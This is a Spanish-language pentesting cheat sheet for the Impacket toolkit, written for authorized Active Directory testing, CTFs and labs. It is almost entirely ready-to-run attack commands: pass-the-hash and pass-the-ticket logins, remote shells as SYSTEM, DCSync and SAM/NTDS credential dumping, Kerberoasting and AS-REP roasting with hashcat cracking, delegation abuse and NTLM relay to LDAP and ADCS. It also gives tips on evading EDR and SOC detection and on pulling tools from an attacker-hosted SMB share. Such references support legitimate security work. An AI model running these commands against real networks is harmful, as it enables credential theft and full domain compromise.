# Impacket — Python Network Protocol Toolkit

Suite de herramientas Python para trabajar con protocolos de red. Fundamental para AD attacks, lateral movement, y explotación de servicios Windows desde Linux.

**Contexto:** Uso en pentesting autorizado de AD, CTFs, y laboratorios de seguridad.

---

## Instalación
```bash
pip install impacket
# O desde source
git clone https://github.com/fortra/impacket.git
cd impacket && pip install .
```

---

## Autenticación — Formatos Comunes

```bash
# Password
<tool>.py domain/user:password@<target>

# Hash NTLM (Pass-the-Hash)
<tool>.py domain/user@<target> -hashes ':<NTLM_hash>'
<tool>.py domain/user@<target> -hashes 'LM:NTLM'

# Kerberos (Pass-the-Ticket)
export KRB5CCNAME=ticket.ccache
<tool>.py domain/user@<target> -k -no-pass

# Sin dominio (auth local)
<tool>.py ./user:password@<target>
```

---

## Remote Execution (Shells)

### psexec.py — PsExec via SMB
```bash
# Shell interactiva como SYSTEM
psexec.py domain/user:password@<target>

# Pass-the-Hash
psexec.py domain/user@<target> -hashes ':<NTLM_hash>'

# Ejecutar comando específico
psexec.py domain/user:password@<target> 'whoami'

# Con Kerberos
psexec.py domain/user@<target> -k -no-pass
```
**Nota:** Ruidoso — sube un servicio, deja logs. Detectado por AV/EDR.

### wmiexec.py — Ejecución via WMI
```bash
# Shell semi-interactiva
wmiexec.py domain/user:password@<target>

# Comando específico
wmiexec.py domain/user:password@<target> 'whoami'

# Sin output en disco (más sigiloso)
wmiexec.py domain/user:password@<target> -silentcommand
```
**Nota:** Más sigiloso que psexec — no sube archivo de servicio.

### smbexec.py — Ejecución via SMB
```bash
# Shell interactiva
smbexec.py domain/user:password@<target>

# Share custom
smbexec.py domain/user:password@<target> -share 'ADMIN$'
```
**Nota:** Similar a psexec pero sin subir binario.

### atexec.py — Ejecución via Task Scheduler
```bash
# Ejecutar comando via scheduled task
atexec.py domain/user:password@<target> 'whoami'

# Con hash
atexec.py domain/user@<target> -hashes ':<NTLM_hash>' 'whoami'
```
**Nota:** Usa Task Scheduler — diferente vector de detección.

### dcomexec.py — Ejecución via DCOM
```bash
# Usar DCOM para ejecutar comandos
dcomexec.py domain/user:password@<target> 'whoami'

# Seleccionar objeto DCOM
dcomexec.py domain/user:password@<target> 'whoami' -object MMC20
dcomexec.py domain/user:password@<target> 'whoami' -object ShellWindows
dcomexec.py domain/user:password@<target> 'whoami' -object ShellBrowserWindow
```

### Comparación de Ejecución Remota

| Herramienta | Puerto | Privilegio | Sigilo | Artefactos |
|-------------|--------|-----------|--------|------------|
| psexec.py | 445 | SYSTEM | Bajo | Servicio creado, binary uploaded |
| wmiexec.py | 135 | User context | Medio | Event logs |
| smbexec.py | 445 | SYSTEM | Medio | Servicio temporal |
| atexec.py | 445 | SYSTEM | Medio | Scheduled task |
| dcomexec.py | 135 | User context | Alto | Menos artefactos |

---

## Credential Harvesting

### secretsdump.py — Dump de Credenciales
```bash
# DCSync (dump all domain hashes — requiere DA o replication rights)
secretsdump.py domain/user:password@<DC_IP>

# DCSync de usuario específico
secretsdump.py domain/user:password@<DC_IP> -just-dc-user administrator

# Solo NTLM hashes (sin Kerberos keys)
secretsdump.py domain/user:password@<DC_IP> -just-dc-ntlm

# SAM + LSA + NTDS de forma remota
secretsdump.py domain/user:password@<target>

# Desde archivos offline (NTDS.dit + SYSTEM hive)
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL

# SAM dump local
secretsdump.py -sam SAM -system SYSTEM LOCAL

# Con hash
secretsdump.py domain/user@<DC_IP> -hashes ':<NTLM_hash>'

# Output a archivo
secretsdump.py domain/user:password@<DC_IP> -outputfile domain_hashes
```

---

## Kerberos Attacks

### GetUserSPNs.py — Kerberoasting
```bash
# Encontrar cuentas con SPN y solicitar TGS
GetUserSPNs.py domain/user:password -dc-ip <DC_IP> -request

# Output a archivo para hashcat
GetUserSPNs.py domain/user:password -dc-ip <DC_IP> -request -outputfile kerberoast.txt

# Para usuario específico
GetUserSPNs.py domain/user:password -dc-ip <DC_IP> -request -target-user svc_account

# Luego crackear con hashcat
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
```

### GetNPUsers.py — AS-REP Roasting
```bash
# Con credenciales — encontrar usuarios AS-REP roastable
GetNPUsers.py domain/user:password -dc-ip <DC_IP> -request

# Sin credenciales — con lista de usuarios
GetNPUsers.py domain/ -dc-ip <DC_IP> -usersfile users.txt -no-pass -request

# Output para hashcat
GetNPUsers.py domain/ -dc-ip <DC_IP> -usersfile users.txt -no-pass -request -outputfile asrep.txt

# Luego crackear
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

### getTGT.py — Obtener Ticket Granting Ticket
```bash
# Con password
getTGT.py domain/user:password -dc-ip <DC_IP>

# Con hash
getTGT.py domain/user -dc-ip <DC_IP> -hashes ':<NTLM_hash>'

# Usar el TGT
export KRB5CCNAME=user.ccache
```

### getST.py — Obtener Service Ticket
```bash
# Solicitar ST para servicio específico
getST.py domain/user:password -dc-ip <DC_IP> -spn cifs/<target>

# Con impersonation (constrained delegation)
getST.py domain/user:password -dc-ip <DC_IP> -spn cifs/<target> -impersonate administrator
```

### ticketConverter.py — Convertir Tickets
```bash
# ccache → kirbi (Linux → Windows)
ticketConverter.py ticket.ccache ticket.kirbi

# kirbi → ccache (Windows → Linux)
ticketConverter.py ticket.kirbi ticket.ccache
```

---

## SMB Tools

### smbclient.py — Cliente SMB
```bash
# Conectar a share
smbclient.py domain/user:password@<target>

# Listar shares
smbclient.py domain/user:password@<target> -shares

# Comandos dentro del cliente
> shares           # Listar shares
> use SHARE_NAME   # Conectar a share
> ls               # Listar archivos
> cd dirname       # Cambiar directorio
> get file.txt     # Descargar archivo
> put local.txt    # Subir archivo
```

### smbserver.py — Servidor SMB
```bash
# Crear share SMB para transferir archivos
smbserver.py share /path/to/share

# Con autenticación
smbserver.py share /path/to/share -username user -password pass

# Soportar SMBv2
smbserver.py share /path/to/share -smb2support

# Desde el target (Windows):
# copy \\attacker_ip\share\file.exe C:\Users\Public\
# net use Z: \\attacker_ip\share
```

---

## LDAP & AD Tools

### GetADUsers.py — Enumerar Usuarios
```bash
GetADUsers.py domain/user:password -dc-ip <DC_IP> -all
```

### findDelegation.py — Encontrar Delegaciones
```bash
findDelegation.py domain/user:password -dc-ip <DC_IP>
```

### addcomputer.py — Agregar Machine Account
```bash
# Agregar computer account (requiere MAQ > 0)
addcomputer.py domain/user:password -dc-ip <DC_IP> -computer-name 'FAKE$' -computer-pass 'Password123!'
```

### rbcd.py — Resource-Based Constrained Delegation
```bash
# Configurar RBCD
rbcd.py domain/user:password -dc-ip <DC_IP> -delegate-to 'TARGET$' -delegate-from 'FAKE$' -action write

# Luego obtener ST con impersonation
getST.py domain/'FAKE$':'Password123!' -dc-ip <DC_IP> -spn cifs/<target> -impersonate administrator
```

---

## NTLM Relay

### ntlmrelayx.py — NTLM Relay
```bash
# Relay a SMB
ntlmrelayx.py -tf targets.txt -smb2support

# Relay a LDAP (para RBCD, shadow credentials, etc.)
ntlmrelayx.py -t ldap://<DC_IP> --delegate-access

# Relay a ADCS HTTP enrollment (ESC8)
ntlmrelayx.py -t http://<CA>/certsrv/certfnsh.asp -smb2support --adcs --template 'Machine'

# Ejecutar comando al hacer relay
ntlmrelayx.py -tf targets.txt -smb2support -c 'whoami'

# Dump SAM al hacer relay
ntlmrelayx.py -tf targets.txt -smb2support --sam

# Con SOCKs proxy (para usar sesión relayed manualmente)
ntlmrelayx.py -tf targets.txt -smb2support -socks
```

---

## Otros Tools Útiles

### reg.py — Registry Remote
```bash
reg.py domain/user:password@<target> query -keyName HKLM\\SOFTWARE
```

### services.py — Service Control
```bash
services.py domain/user:password@<target> list
services.py domain/user:password@<target> start -name <service>
```

### lookupsid.py — SID Enumeration
```bash
# Enumerar SIDs y usuarios
lookupsid.py domain/user:password@<target> 20000
```

### samrdump.py — SAM Enumeration
```bash
samrdump.py domain/user:password@<target>
```

---

## Tips

- **psexec vs wmiexec vs smbexec:** Empezar con wmiexec (más sigiloso), escalar a psexec si necesitas SYSTEM
- **secretsdump es ruidoso** — DCSync genera eventos de replicación detectables por SOC
- **Kerberos auth** — preferir `-k -no-pass` cuando posible, evita pasar passwords por red
- **smbserver.py** — invaluable para transferir herramientas al target
- **ntlmrelayx + PetitPotam** — combo clásico para escalar en AD moderno, pero verificar viabilidad primero (ver `tools/responder-relay.md` sección de viabilidad)
- **Siempre exportar hashes a archivo** — usar `-outputfile` para no perder output
- **MSSQL avanzado** — para linked server pivoting, OLE Automation, CLR assemblies, SQL Agent abuse, y NTLM coercion via xp_dirtree, ver `tools/mssql-attacks.md`
- **Cross-forest** — para ataques cross-forest (Kerberoasting, TDO, ADCS), ver `references/cross-forest-trusts.md`
